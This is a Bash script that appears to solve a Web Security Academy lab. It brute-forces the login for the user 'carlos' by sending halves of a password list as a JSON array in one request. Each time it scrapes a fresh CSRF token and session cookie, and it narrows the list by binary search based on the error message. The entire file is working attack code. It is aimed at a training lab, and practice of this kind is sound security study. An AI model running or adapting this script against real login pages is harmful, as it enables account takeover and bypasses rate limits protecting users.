#!/bin/bash

URL='https://acd41fb21eba1524804c04b7006700ef.web-security-academy.net/login'
NULL='/dev/null'

USER="carlos"

#cp password.txt pass0.txt

for i in `seq 1 7`
do
    echo "Estoy dentro de tu $i"
    
    REQUEST1=`curl $URL -D- -s`
    CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
    COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`

    LINESS=`cat pass0.txt | wc -l`

    sed -n 1,$[$LINESS/2]p pass0.txt > pass1.txt
    sed -n $[$LINESS/2+1],$[$LINESS]p pass0.txt > pass2.txt

    PASS1=`cat pass1.txt | tr '\n' ':' | sed s/':'/'","'/g`
    PASS2=`cat pass2.txt | tr '\n' ':' | sed s/':'/'","'/g`

    DATA='{"csrf":"'$CSRF'","username":"'$USER'","password":["'${PASS1::-3}'"]}'
    RESULT1=`curl $URL -d $DATA -b $COOKIE -s`
    #echo "Resultado uno"
    #echo $RESULT1
    
    REQUEST1=`curl $URL -D- -s`
    CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
    COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`
    
    DATA='{"csrf":"'$CSRF'","username":"'$USER'","password":["'${PASS2::-3}'"]}'
    RESULT2=`curl $URL -d $DATA -b $COOKIE -s`
    #echo "Resultado dos"
    #echo $RESULT2
    
    if echo $RESULT1 | grep -o "Invalid username or password" > $NULL
    then
            #echo "Aqui en pass1.txt no es"
            echo "La clave debe estar en: ${PASS2::-3}"
            cat pass2.txt > pass0.txt
    fi

    if echo $RESULT2 | grep -o "Invalid username or password" > $NULL
    then
            #echo "Aqui en pass2.txt no es"
            echo "La clave debe estar en: ${PASS1::-3}"
            cat pass1.txt > pass0.txt
    fi
    sleep 1
done





